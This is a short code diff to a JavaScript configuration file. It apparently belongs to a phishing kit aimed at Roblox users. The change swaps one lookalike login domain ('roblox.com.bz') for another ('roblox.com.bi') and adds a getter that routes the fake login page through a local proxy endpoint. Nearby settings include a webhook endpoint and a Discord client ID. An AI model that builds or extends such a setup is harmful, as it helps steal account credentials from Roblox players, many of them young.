@@ -6,7 +6,10 @@ export const CONFIG = {
   API_WEBHOOK_ENDPOINT: "/api/webhook",
   API_ROBLOX_ENDPOINT: "/api/roblox",
   API_PROXY_ENDPOINT: "/api/proxy",
-  TARGET_URL: "https://roblox.com.bz/login?returnUrl=4191421542448922",
+  TARGET_URL: "https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F919588160482%2Fprofile",
+  get PROXIED_TARGET_URL() {
+    return `/api/proxy?url=${encodeURIComponent(this.TARGET_URL)}`;
+  },
 
   // Discord Application Client ID
   CLIENT_ID: "1541620007560020029",
